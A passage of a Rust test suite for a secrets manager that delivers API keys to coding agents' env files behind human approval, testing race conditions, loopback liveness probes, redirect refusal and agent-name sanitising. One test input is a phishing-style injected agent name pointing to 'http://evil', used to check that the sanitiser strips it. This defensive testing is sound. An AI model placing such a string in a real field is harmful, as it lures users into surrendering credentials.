    let cfg = Config { verify_every: config::VerifyEvery::Always, ..Default::default() };
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    // while the probe is "in flight", another process replaces the key
    let stub = |_: &registry::Check| {
        stash.set(&stash::stash_key("OPENAI_API_KEY", "default"), &SecretString::from("sk-new-aaaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
        validate::Liveness::Rejected(401)
    };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    seed(&db, stash.as_ref(), &proj, "OPENAI_API_KEY", "sk-old-aaaaaaaaaaaaaaaaaaaaa", None);
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { unverified: true, .. }), "{out:?}");
    assert!(!db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap().stale, "the old value's verdict must not stale the new value");
    let written = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    assert!(written.contains("sk-new-"), "the value stored now is what lands, not the one probed: {written}");
    assert!(!written.contains("sk-old-"));
}

/// Verify-on-use compares the stash with the probed value and applies the verdict under one
/// index write lock. A store that tries to land between the two waits for it, so the 401
/// is recorded against the value it was about and never against the new one.
#[test]
fn an_at_use_verdict_and_its_comparison_share_one_lock() {
    let _env = env_lock();
    let (home, proj) = verify_setup("at-use-lock");
    let cfg = Config { verify_every: config::VerifyEvery::Always, ..Default::default() };
    let db = Db::open(&home.join("t.db")).unwrap();
    let human_db = Db::open(&home.join("t.db")).unwrap();
    human_db.conn.busy_timeout(std::time::Duration::from_millis(10)).unwrap();
    let human_stash = stash::open(&cfg).unwrap();
    let human = tasks::Ctx { cfg: &cfg, db: &human_db, stash: human_stash.as_ref(), probe: tasks::Probe::Off };
    let new_value = SecretString::from("sk-new-bbbbbbbbbbbbbbbbbbbbb".to_string());
    let store_new = || tasks::store_and_inject(&human, "OPENAI_API_KEY", "default", &new_value, None, None, false, &proj, "human", None, tasks::Verified::Unknown, db::GRANT_PASTE);
    // The human stores a new value just after verify-on-use reads the stash back.
    let attempt = std::cell::RefCell::new(None::<String>);
    let stash = GetHookStash {
        inner: stash::open(&cfg).unwrap(),
        armed: std::cell::Cell::new(false),
        hook: || *attempt.borrow_mut() = Some(match store_new() { Ok(_) => "stored".into(), Err(e) => format!("{e:#}") }),
    };
    let stub = |_: &registry::Check| { stash.armed.set(true); validate::Liveness::Rejected(401) };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Stub(&stub) };
    seed(&db, &stash, &proj, "OPENAI_API_KEY", "sk-old-aaaaaaaaaaaaaaaaaaaaa", None);
    let out = need::need(&ctx, &proj, "agent", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let attempt = attempt.borrow().clone().expect("the hook ran");
    assert!(attempt.contains("locked"), "a store landed between the comparison and the verdict: {attempt}");
    // The 401 was about the value still stored, so it stands.
    assert!(db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap().stale);
    assert!(matches!(out[0], need::Outcome::Pending { .. }), "{out:?}");
    // The call released the lock, so the human's store goes through now and is not stale.
    store_new().unwrap();
    assert!(!db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap().stale);
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// `need` read A from the stash. Before it writes the env file, the human stores B and B is
/// written there. The delivery then writes what the stash holds under the env file's lock,
/// so it cannot put A back over B and report success.
#[test]
fn a_delivery_never_writes_an_older_value_over_a_newer_store() {
    let _env = env_lock();
    let (home, proj) = verify_setup("deliver-older");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let human_db = Db::open(&home.join("t.db")).unwrap();
    let human_stash = stash::open(&cfg).unwrap();
    let human = tasks::Ctx { cfg: &cfg, db: &human_db, stash: human_stash.as_ref(), probe: tasks::Probe::Off };
    let new_value = SecretString::from("sk-new-bbbbbbbbbbbbbbbbbbbbb".to_string());
    let stash = GetHookStash {
        inner: stash::open(&cfg).unwrap(),
        armed: std::cell::Cell::new(false),
        hook: || { tasks::store_and_inject(&human, "OPENAI_API_KEY", "default", &new_value, None, None, false, &proj, "human", None, tasks::Verified::Unknown, db::GRANT_PASTE).unwrap(); },
    };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Off };
    seed(&db, &stash, &proj, "OPENAI_API_KEY", "sk-old-aaaaaaaaaaaaaaaaaaaaa", None);
    // The hook runs right after `need` reads the stash.
    stash.armed.set(true);
    let out = need::need(&ctx, &proj, "agent", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let written = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    assert!(written.contains("sk-new-") && !written.contains("sk-old-"), "the env file holds what the stash holds: {written}");
    assert!(matches!(out[0], need::Outcome::Injected { unverified: true, .. }), "a value the caller did not read is delivered unverified: {out:?}");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// A broad grant covers a name only while its value is not sensitive. When a live-mode key
/// replaces a test-mode one between the gate and the write, the broad grant does not
/// deliver it, and the directory is asked instead.
#[test]
fn a_broad_delivery_does_not_write_a_sensitive_value_stored_under_it() {
    let _env = env_lock();
    let (home, proj) = verify_setup("deliver-broad");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let human_stash = stash::open(&cfg).unwrap();
    let key = stash::stash_key("CLERK_SECRET_KEY", "default");
    // A human's store has written a live-mode key to the stash and not yet committed its
    // index row, so the gate still reads the test-mode key's record.
    let stash = GetHookStash {
        inner: stash::open(&cfg).unwrap(),
        armed: std::cell::Cell::new(false),
        hook: || human_stash.set(&key, &SecretString::from("sk_live_bbbbbbbbbbbbbbbbbbbbb".to_string())).unwrap(),
    };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &stash, probe: tasks::Probe::Off };
    stash.set(&key, &SecretString::from("sk_test_aaaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
    let ws = db.workspace_for(&proj).unwrap();
    db.grant(&ws.id, "*", "default", db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
    stash.armed.set(true);
    let out = need::need(&ctx, &proj, "agent", &["CLERK_SECRET_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }), "{out:?}");
    assert!(!envfile::has(&proj, ".env.local", "CLERK_SECRET_KEY"), "nothing is written here");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// A store pauses after its COMMIT. Another process stores B and writes it to the env file.
/// The first store then writes what the stash holds, B, not the A it stored.
#[test]
fn a_store_paused_after_its_commit_does_not_write_over_a_newer_store() {
    let _env = env_lock();
    let (home, proj) = verify_setup("store-order");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let (db_path, project) = (home.join("t.db"), proj.clone());
    tasks::AFTER_STORE_COMMIT.with(|h| *h.borrow_mut() = Some(Box::new(move || {
        let cfg = Config::default();
        let db = Db::open(&db_path).unwrap();
        let stash = stash::open(&cfg).unwrap();
        let other = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
        tasks::store_and_inject(&other, "OPENAI_API_KEY", "default", &SecretString::from("sk-second-bbbbbbbbbbbbbbbbbbbb".to_string()), None, None, false, &project, "human", None, tasks::Verified::Unknown, db::GRANT_PASTE).unwrap();
    })));
    tasks::store_and_inject(&ctx, "OPENAI_API_KEY", "default", &SecretString::from("sk-first-aaaaaaaaaaaaaaaaaaaaa".to_string()), None, None, false, &proj, "human", None, tasks::Verified::Unknown, db::GRANT_PASTE).unwrap();
    let written = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    assert!(written.contains("sk-second-") && !written.contains("sk-first-"), "the env file holds what the stash holds: {written}");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// After this store commits A, another store puts B in the stash, and B is marked stale.
/// This store's env file write re-reads the stash, finds B, and refuses it the way
/// `need::deliver` refuses a changed value that is stale. It says nothing was written.
#[test]
fn a_store_does_not_write_a_stale_replacement_it_finds_in_the_stash() {
    let _env = env_lock();
    let (home, proj) = verify_setup("store-stale-replacement");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let (db_path, other_dir) = (home.join("t.db"), tmp("verify-store-stale-replacement-other").canonicalize().unwrap());
    tasks::AFTER_STORE_COMMIT.with(|h| *h.borrow_mut() = Some(Box::new(move || {
        let cfg = Config::default();
        let db = Db::open(&db_path).unwrap();
        let stash = stash::open(&cfg).unwrap();
        let other = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
        tasks::store_and_inject(&other, "OPENAI_API_KEY", "default", &SecretString::from("sk-second-bbbbbbbbbbbbbbbbbbbb".to_string()), None, None, false, &other_dir, "human", None, tasks::Verified::Unknown, db::GRANT_PASTE).unwrap();
        db.mark_stale("OPENAI_API_KEY", "default", true, Some("rejected by OpenAI (HTTP 401)"), Some(db::STALE_PROBE)).unwrap();
    })));
    let err = tasks::store_and_inject(&ctx, "OPENAI_API_KEY", "default", &SecretString::from("sk-first-aaaaaaaaaaaaaaaaaaaaa".to_string()), None, None, false, &proj, "human", None, tasks::Verified::Unknown, db::GRANT_PASTE)
        .expect_err("a stale value is not written");
    assert!(format!("{err:#}").contains("marked stale"), "{err:#}");
    assert!(!proj.join(".env.local").exists(), "nothing written here");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// `forget` removes the key after the answer's store commits and before its env file write.
/// The answer reports that nothing was written instead of reporting a delivery.
#[test]
fn an_answer_whose_key_is_forgotten_before_the_env_write_reports_it() {
    let _env = env_lock();
    let (home, proj) = verify_setup("store-forgotten");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let card = tasks::create_secret_task(&ctx, &proj, "agent", "OPENAI_API_KEY", "default", &Default::default()).unwrap();
    let key = stash::stash_key("OPENAI_API_KEY", "default");
    tasks::AFTER_STORE_COMMIT.with(|h| *h.borrow_mut() = Some(Box::new(move || {
        stash::open(&Config::default()).unwrap().delete(&key).unwrap();
    })));
    let err = tasks::answer_secret(&ctx, &card, SecretString::from("sk-forgotten-aaaaaaaaaaaaaaaaa".to_string()), true).expect_err("nothing reached the env file");
    assert!(format!("{err:#}").contains("removed from the stash"), "{err:#}");
    assert!(!proj.join(".env.local").exists());
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// A report's probe takes seconds. When the human stores a new value meanwhile, the verdict
/// about the old one changes nothing: a 401 does not mark the new value stale (which would
/// file a Replace card for it), and an Ok does not clear a flag the new value earned.
#[test]
fn a_report_verdict_for_a_replaced_value_changes_nothing() {
    let _env = env_lock();
    let (home, proj) = verify_setup("report-race");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let human_db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let human = tasks::Ctx { cfg: &cfg, db: &human_db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let store = |v: &str| {
        tasks::store_and_inject(&human, "OPENAI_API_KEY", "default", &SecretString::from(v.to_string()), None, None, false, &proj, "human", None, tasks::Verified::Unknown, db::GRANT_PASTE).unwrap();
    };
    store("sk-old-aaaaaaaaaaaaaaaaaaaaa");

    // The provider's 401 for the old value comes back after the human stored a new one.
    let rejecting = |_: &registry::Check| { store("sk-new-bbbbbbbbbbbbbbbbbbbbb"); validate::Liveness::Rejected(401) };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&rejecting) };
    assert_eq!(tasks::report_bad(&ctx, &proj, "agent", "OPENAI_API_KEY", "default", Some(401)).unwrap(), tasks::ReportOutcome::Ignored);
    assert!(!db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap().stale, "the old value's 401 must not mark the new value stale");
    assert!(db.recent_audit(5).unwrap().iter().any(|r| r.3 == "report.superseded"));
    let off = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let out = need::need(&off, &proj, "agent", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }), "no Replace card for the new value: {out:?}");

    // The provider's Ok for that value comes back after a third one was stored and found dead.
    let accepting = |_: &registry::Check| {
        store("sk-third-ccccccccccccccccccc");
        human_db.mark_stale("OPENAI_API_KEY", "default", true, Some("rejected by OpenAI (HTTP 401)"), Some(db::STALE_PROBE)).unwrap();
        validate::Liveness::Ok
    };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&accepting) };
    assert_eq!(tasks::report_bad(&ctx, &proj, "agent", "OPENAI_API_KEY", "default", Some(401)).unwrap(), tasks::ReportOutcome::Ignored);
    let m = db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap();
    assert!(m.stale, "the old value's Ok must not clear the new value's stale flag");
    assert!(m.last_verified.is_none());
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

#[test]
fn verify_every_parses_strictly() {
    use config::VerifyEvery::*;
    assert_eq!(config::VerifyEvery::parse("24h").unwrap(), Every(std::time::Duration::from_secs(86400)));
    assert_eq!(config::VerifyEvery::parse("30m").unwrap(), Every(std::time::Duration::from_secs(1800)));
    assert_eq!(config::VerifyEvery::parse("always").unwrap(), Always);
    assert_eq!(config::VerifyEvery::parse(" never ").unwrap(), Never);
    assert_eq!(config::VerifyEvery::parse("8760h").unwrap(), Every(std::time::Duration::from_secs(8760 * 3600)), "a year is the cap");
    let c: Config = toml::from_str("verify_every = \"90m\"").unwrap();
    assert!(toml::to_string(&c).unwrap().contains("verify_every = \"90m\""));
    assert!(toml::from_str::<Config>("verify_evry = \"never\"").is_err(), "a typo must not silently keep the default");
    for bad in ["0m", "0h", "5s", "", "daily", "h", "-1h", "+5h", "5м", "24ｈ", "99999999999999999999h", "9000h", "1.5h", " 1 h"] {
        assert!(config::VerifyEvery::parse(bad).is_err(), "{bad:?} must be rejected");
    }
    let c: Config = toml::from_str("verify_every = \"2h\"").unwrap();
    assert_eq!(c.verify_every, Every(std::time::Duration::from_secs(7200)));
    assert!(toml::from_str::<Config>("verify_every = \"sometimes\"").is_err());
    assert_eq!(Config::default().verify_every, Every(std::time::Duration::from_secs(86400)));
    let s = toml::to_string(&Config::default()).unwrap();
    assert!(s.contains("verify_every = \"24h\""), "{s}");
}

#[test]
fn registry_at_use_is_a_deliberate_allowlist() {
    for p in registry::all() {
        let Some(c) = &p.check else { continue };
        if c.at_use {
            assert!(!c.reject_status.contains(&400), "{}: a generic 400 reject cannot run unattended", p.name);
            assert!(c.reject_status.iter().all(|s| *s == 403), "{}: only a documented 403-for-bad-token provider may add a reject status at use", p.name);
            assert!(!c.url.contains("search"), "{}: a metered endpoint cannot run unattended", p.name);
            assert!(c.url.starts_with("https://"), "{}", p.name);
        }
    }
    assert!(registry::lookup("OPENAI_API_KEY").unwrap().check.as_ref().unwrap().at_use);
    assert!(!registry::lookup("CLOUDFLARE_API_TOKEN").unwrap().check.as_ref().unwrap().at_use, "200 with status=expired in the body");
    assert!(!registry::lookup("ELEVENLABS_API_KEY").unwrap().check.as_ref().unwrap().at_use, "401 missing_permissions for a live restricted key");
    assert_eq!(registry::lookup("VERCEL_TOKEN").unwrap().check.as_ref().unwrap().reject_status, vec![403], "Vercel answers 403 for a bad token");
}

/// A one-shot loopback HTTP server: records the request head, answers with `response`.
fn loopback(response: &'static str) -> (String, std::sync::mpsc::Receiver<String>, std::thread::JoinHandle<()>) {
    use std::io::{Read, Write};
    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}/probe", l.local_addr().unwrap());
    let (tx, rx) = std::sync::mpsc::channel();
    let h = std::thread::spawn(move || {
        l.set_nonblocking(false).unwrap();
        for _ in 0..2 {
            let Ok((mut s, _)) = l.accept() else { return };
            s.set_read_timeout(Some(std::time::Duration::from_secs(2))).unwrap();
            let mut buf = [0u8; 4096];
            let n = s.read(&mut buf).unwrap_or(0);
            let _ = tx.send(String::from_utf8_lossy(&buf[..n]).to_string());
            if response.is_empty() { std::thread::sleep(std::time::Duration::from_secs(3)); return }
            let _ = s.write_all(response.as_bytes());
        }
    });
    (url, rx, h)
}

fn check_for(url: &str, auth: &str) -> registry::Check {
    registry::Check { method: "GET".into(), url: url.into(), auth: auth.into(), headers: Default::default(), reject_status: vec![], at_use: true }
}

#[test]
fn liveness_verdicts_over_loopback() {
    let v = SecretString::from("sk-probe-value-000000000000".to_string());
    let t = std::time::Duration::from_secs(1);
    // 401 → Rejected, and the header is exactly the documented one
    let (url, rx, _h) = loopback("HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
    assert_eq!(validate::liveness(&check_for(&url, "bearer"), &v, t), validate::Liveness::Rejected(401));
    let req = rx.recv().unwrap();
    assert!(req.contains("Authorization: Bearer sk-probe-value-000000000000"), "{req}");
    // 403 → Unknown: a restricted key is a live key
    let (url, _rx, _h) = loopback("HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
    assert!(matches!(validate::liveness(&check_for(&url, "bearer"), &v, t), validate::Liveness::Unknown(_)));
    // 200 → Ok
    let (url, _rx, _h) = loopback("HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}");
    assert_eq!(validate::liveness(&check_for(&url, "header:xi-api-key"), &v, t), validate::Liveness::Ok);
    // 302 → Unknown, and the redirect is NOT followed: the custom header never leaves for
    // the target. The same listener plays both origins; exactly one request must arrive.
    let (url, rx, _h) = loopback("HTTP/1.1 302 Found\r\nLocation: /elsewhere\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
    assert!(matches!(validate::liveness(&check_for(&url, "header:xi-api-key"), &v, t), validate::Liveness::Unknown(_)));
    let first = rx.recv().unwrap();
    assert!(first.contains("xi-api-key: sk-probe-value"), "{first}");
    assert!(rx.recv_timeout(std::time::Duration::from_millis(500)).is_err(), "the redirect target must never receive a request");
    // no response inside the timeout → Unknown, and the error text does not carry the key
    let (url, _rx, _h) = loopback("");
    let started = std::time::Instant::now();
    match validate::liveness(&check_for(&url, "query:key"), &v, t) {
        validate::Liveness::Unknown(e) => assert!(!e.contains("sk-probe"), "{e}"),
        o => panic!("{o:?}"),
    }
    assert!(started.elapsed() < std::time::Duration::from_secs(3));
}


#[test]
fn probe_budget_delivers_unverified_without_taking_a_lease() {
    let _env = env_lock();
    let (home, proj) = verify_setup("budget");
    let cfg = Config { verify_every: config::VerifyEvery::Always, ..Default::default() };
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let calls = std::cell::Cell::new(0);
    let stub = |_: &registry::Check| { calls.set(calls.get() + 1); validate::Liveness::Ok };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    seed(&db, stash.as_ref(), &proj, "OPENAI_API_KEY", "sk-live-aaaaaaaaaaaaaaaaaaaa", None);
    let names = ["OPENAI_API_KEY".to_string()];
    let out = need::need_with_budget(&ctx, &proj, "t", &names, &need::NeedOpts::default(), &mut need::ProbeBudget::exhausted()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { unverified: true, .. }), "{out:?}");
    assert_eq!(calls.get(), 0);
    assert!(db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap().next_probe.is_none(), "no lease taken: the next call may probe");
    let out = need::need(&ctx, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { unverified: false, .. }));
    assert_eq!(calls.get(), 1);
}

#[test]
fn old_databases_get_stale_source_backfilled() {
    let home = tmp("migrate");
    let path = home.join("old.db");
    {
        let c = rusqlite::Connection::open(&path).unwrap();
        c.execute_batch("CREATE TABLE secrets (name TEXT NOT NULL, identity TEXT NOT NULL DEFAULT 'default', provider TEXT, sensitive INTEGER NOT NULL DEFAULT 0, source_url TEXT, created TEXT NOT NULL, last_used TEXT, stale INTEGER NOT NULL DEFAULT 0, last_verified TEXT, stale_reason TEXT, PRIMARY KEY(name, identity));").unwrap();
        c.execute("INSERT INTO secrets (name, created, stale, stale_reason) VALUES ('ROT', '2026-01-01T00:00:00Z', 1, ?1)", [format!("{} (old)", Db::ROTATE_REASON)]).unwrap();
        c.execute("INSERT INTO secrets (name, created, stale, stale_reason) VALUES ('REP', '2026-01-01T00:00:00Z', 1, 'rejected by X (HTTP 401) ...')", []).unwrap();
        c.execute("INSERT INTO secrets (name, created, stale) VALUES ('OK', '2026-01-01T00:00:00Z', 0)", []).unwrap();
    }
    let db = Db::open(&path).unwrap();
    assert_eq!(db.get_secret("ROT", "default").unwrap().unwrap().stale_source.as_deref(), Some(db::STALE_ROTATE));
    assert_eq!(db.get_secret("REP", "default").unwrap().unwrap().stale_source.as_deref(), Some(db::STALE_REPORT));
    let ok = db.get_secret("OK", "default").unwrap().unwrap();
    assert!(ok.stale_source.is_none() && ok.next_probe.is_none() && !ok.verify_off);
    // and the rotation survives a probe saying Ok, the report does not
    db.set_verified("ROT", "default").unwrap();
    db.set_verified("REP", "default").unwrap();
    assert!(db.get_secret("ROT", "default").unwrap().unwrap().stale);
    assert!(!db.get_secret("REP", "default").unwrap().unwrap().stale);
    // reopening is idempotent
    drop(db);
    Db::open(&path).unwrap();
}

#[test]
fn agent_names_are_short_and_printable() {
    assert_eq!(need::clean_agent("claude-code"), "claude-code");
    assert_eq!(need::clean_agent("Codex CLI/1.2"), "Codex CLI1.2");
    assert_eq!(need::clean_agent("<b>PASTE YOUR KEY AT http://evil</b>"), "bPASTE YOUR KEY AT httpevilb");
    assert_eq!(need::clean_agent(&"x".repeat(200)).len(), 48);
    assert_eq!(need::clean_agent("\n\t\u{202e}"), "agent");
}

#[test]
fn unverified_reports_count_toward_the_cooldown() {
    let _env = env_lock();
    let (home, proj) = verify_setup("reportcool");
    let cfg = Config { verify_every: config::VerifyEvery::Never, ..Default::default() };
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let calls = std::cell::Cell::new(0);
    let stub = |_: &registry::Check| { calls.set(calls.get() + 1); validate::Liveness::Unknown("HTTP 403".into()) };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    seed(&db, stash.as_ref(), &proj, "OPENAI_API_KEY", "sk-restricted-aaaaaaaaaaaaaaa", None);
    need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    // a report that the provider cannot confirm (403 → no verdict) is one probe, then silence
    for _ in 0..3 {
        tasks::report_bad(&ctx, &proj, "t", "OPENAI_API_KEY", "default", Some(403)).unwrap();
    }
    assert_eq!(calls.get(), 1, "an agent looping secrets_report_invalid must not loop the provider");
    assert!(!db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap().stale);
}

#[test]
fn skipping_the_check_on_an_uncheckable_key_does_not_flag_it() {
    let _env = env_lock();
    let (home, proj) = verify_setup("uncheckable");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let out = need::need(&ctx, &proj, "t", &["MY_CUSTOM_TOKEN".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    tasks::answer_secret(&ctx, &db.get_task(&tid).unwrap().unwrap(), SecretString::from("custom-token-value-1234567890".to_string()), true).unwrap();
    assert!(!db.get_secret("MY_CUSTOM_TOKEN", "default").unwrap().unwrap().verify_off, "nothing to skip for a key without a probe");
}


// ---------------------------------------------------------------------------------------
// trust v2: nothing is trusted by folder; each directory pairs once, per key

fn v2_world(tag: &str) -> (PathBuf, PathBuf) {
    let home = tmp(&format!("v2-{tag}-home"));
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp(&format!("v2-{tag}-proj")).canonicalize().unwrap();
    (home, proj)
}

#[test]
fn first_contact_files_one_pairing_card_and_allow_broad_covers_registry_keys_only() {
    let _g = env_lock();
    let (home, proj) = v2_world("pairing");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    for (n, v) in [("OPENAI_API_KEY", "sk-aaaaaaaaaaaaaaaaaaaa"), ("GROQ_API_KEY", "gsk_bbbbbbbbbbbbbbbb"), ("STRIPE_SECRET_KEY", "sk_live_cccccccccccc"), ("MY_INTERNAL_TOKEN", "internal-dddddddddddd")] {
        stash.set(&stash::stash_key(n, "default"), &SecretString::from(v.to_string())).unwrap();
        db.upsert_secret(&db::SecretMeta { name: n.into(), identity: "default".into(), provider: None, sensitive: n == "STRIPE_SECRET_KEY", source_url: None, created: now(), last_used: None, stale: false, last_verified: None, stale_reason: None, stale_source: None, next_probe: None, verify_off: false }).unwrap();
    }
    let names: Vec<String> = ["OPENAI_API_KEY", "GROQ_API_KEY", "STRIPE_SECRET_KEY", "MY_INTERNAL_TOKEN"].iter().map(|s| s.to_string()).collect();
    let out = need::need(&ctx, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    assert!(out.iter().all(|o| matches!(o, need::Outcome::Pending { .. })), "{out:?}");
    assert!(!proj.join(".env.local").exists(), "nothing written before the human answers");
    // two cards: one pairing card for the two ordinary keys, one sensitive card for the rest
    let ids: std::collections::BTreeSet<String> = out.iter().filter_map(|o| if let need::Outcome::Pending { task_id, .. } = o { Some(task_id.clone()) } else { None }).collect();
    assert_eq!(ids.len(), 2, "{out:?}");
    let open = db.list_tasks(Some(&proj.to_string_lossy()), true).unwrap();
    let pairing = open.iter().find(|t| t.expects == tasks::APPROVAL_PAIRING).expect("pairing card");
    let sens = open.iter().find(|t| t.expects == tasks::APPROVAL_SENSITIVE).expect("sensitive card");
    assert_eq!(pairing.names.len(), 2);
    assert!(sens.names.iter().any(|n| n.starts_with("STRIPE")) && sens.names.iter().any(|n| n.starts_with("MY_INTERNAL")), "sensitive AND unregistered: {:?}", sens.names);
    assert!(pairing.why.as_deref().unwrap().contains(".env.local"), "card names the destination file");
    // a second request while the card is open merges into it, no new card
    stash.set(&stash::stash_key("RESEND_API_KEY", "default"), &SecretString::from("re_eeeeeeeeeeeeeeee".to_string())).unwrap();
    need::need(&ctx, &proj, "t", &["RESEND_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert_eq!(db.list_tasks(Some(&proj.to_string_lossy()), true).unwrap().len(), 2);
    assert_eq!(db.get_task(&pairing.id).unwrap().unwrap().names.len(), 3);
    // Allow broad: the listed keys + any registry non-sensitive key for `default` here
    tasks::answer_approval(&ctx, &db.get_task(&pairing.id).unwrap().unwrap(), tasks::Decision::AllowBroad, None).unwrap();
    let ws = db.find_workspace(&proj).unwrap().unwrap();
    assert!(db.has_broad_grant(&ws.id, "default").unwrap());
    assert_eq!(db.grant_source(&ws.id, "OPENAI_API_KEY", "default").unwrap().as_deref(), Some(db::GRANT_PAIRING));
    assert!(envfile::has(&proj, ".env.local", "OPENAI_API_KEY") && envfile::has(&proj, ".env.local", "GROQ_API_KEY"));
    assert!(!envfile::has(&proj, ".env.local", "STRIPE_SECRET_KEY"), "sensitive keys wait for their own card");
    // a never-listed registry key is now silent; sensitive/unregistered still are not
    stash.set(&stash::stash_key("MISTRAL_API_KEY", "default"), &SecretString::from("mistral-ffffffffffffffff".to_string())).unwrap();
    let out = need::need(&ctx, &proj, "t", &["MISTRAL_API_KEY".to_string(), "STRIPE_SECRET_KEY".to_string(), "MY_INTERNAL_TOKEN".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }), "{out:?}");
    assert!(matches!(out[1], need::Outcome::Pending { .. }) && matches!(out[2], need::Outcome::Pending { .. }));
    // the sensitive card cannot be answered broadly
    assert!(tasks::answer_approval(&ctx, &db.get_task(&sens.id).unwrap().unwrap(), tasks::Decision::AllowBroad, None).is_err());
    tasks::answer_approval(&ctx, &db.get_task(&sens.id).unwrap().unwrap(), tasks::Decision::Allow, None).unwrap();
    assert_eq!(db.grant_source(&ws.id, "STRIPE_SECRET_KEY", "default").unwrap().as_deref(), Some(db::GRANT_SENSITIVE));
    assert!(envfile::has(&proj, ".env.local", "STRIPE_SECRET_KEY"));
    // audit rows say which grant delivered
    let rows = db.recent_audit(50).unwrap();
